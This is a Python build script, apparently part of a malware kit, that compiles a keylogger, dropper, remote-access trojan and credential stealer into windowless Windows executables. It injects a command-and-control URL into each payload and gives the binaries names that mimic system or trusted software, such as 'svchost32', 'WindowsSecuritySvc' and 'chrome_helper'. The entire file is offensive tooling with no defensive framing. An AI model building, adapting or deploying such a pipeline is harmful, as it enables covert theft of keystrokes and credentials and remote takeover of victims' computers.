#!/usr/bin/env python3
"""
build.py — Compile les payloads en .exe Windows
Usage : python build.py
"""
import os, sys, subprocess, pathlib, json

BUILDS_DIR = pathlib.Path("builds")
BUILDS_DIR.mkdir(exist_ok=True)

def get_public_url() -> str:
    env = os.environ.get("FLASHCMD_PUBLIC_URL", "")
    if env:
        return env.rstrip("/")
    cfg = pathlib.Path(".config.json")
    if cfg.exists():
        try:
            return json.loads(
                cfg.read_text()
            ).get("public_url", "").rstrip("/")
        except Exception:
            pass
    return "http://localhost:8080"

PAYLOADS = [
    {
        "script":    "payloads/keylogger_win.py",
        "outname":   "WindowsSecuritySvc",
        "noconsole": True,
    },
    {
        "script":    "payloads/dropper.py",
        "outname":   "setup_update",
        "noconsole": True,
    },
    {
        "script":    "payloads/rat.py",
        "outname":   "svchost32",
        "noconsole": True,
    },
    {
        "script":    "payloads/stealer.py",
        "outname":   "chrome_helper",
        "noconsole": True,
    },
]

def build(payload: dict, public_url: str):
    script  = payload["script"]
    outname = payload["outname"]

    code = pathlib.Path(script).read_text(
        encoding="utf-8", errors="replace"
    )
    host = public_url.split("//")[-1].split(":")[0]
    port = "443" if "https" in public_url else "8080"
    code = code.replace("FILL_C2_URL",  public_url)
    code = code.replace("FILL_C2_HOST", host)
    code = code.replace("FILL_PORT",    port)

    tmp = pathlib.Path(f"_tmp_{outname}.py")
    tmp.write_text(code, encoding="utf-8")

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--distpath",  str(BUILDS_DIR),
        "--workpath",  "_pyinstaller_work",
        "--specpath",  "_pyinstaller_spec",
        "--name",      outname,
        "--clean",
        "--hidden-import", "pynput",
        "--hidden-import", "pynput.keyboard",
        "--hidden-import", "pynput.keyboard._win32",
        "--hidden-import", "cryptography",
        "--hidden-import", "PIL",
        "--hidden-import", "PIL.ImageGrab",
    ]
    if payload.get("noconsole"):
        cmd.append("--noconsole")
    cmd.append(str(tmp))

    print(f"\n[*] Compilation de {outname}.exe…")
    result = subprocess.run(
        cmd, capture_output=True, text=True)
    tmp.unlink(missing_ok=True)

    if result.returncode == 0:
        exe  = BUILDS_DIR / (outname + ".exe")
        size = exe.stat().st_size / 1024 / 1024
        print(f"[+] {outname}.exe → {size:.1f} MB")
    else:
        print(f"[!] Erreur {outname}:")
        print(result.stderr[-800:])

if __name__ == "__main__":
    public_url = get_public_url()
    print(f"\n[*] Build avec C2 = {public_url}")
    custom = input(
        f"Changer l'URL C2 ? [{public_url}] : "
    ).strip()
    if custom:
        public_url = custom
    print("[*] Compilation en cours…\n")
    for p in PAYLOADS:
        build(p, public_url)
    print(f"\n[+] .exe dans : {BUILDS_DIR}/")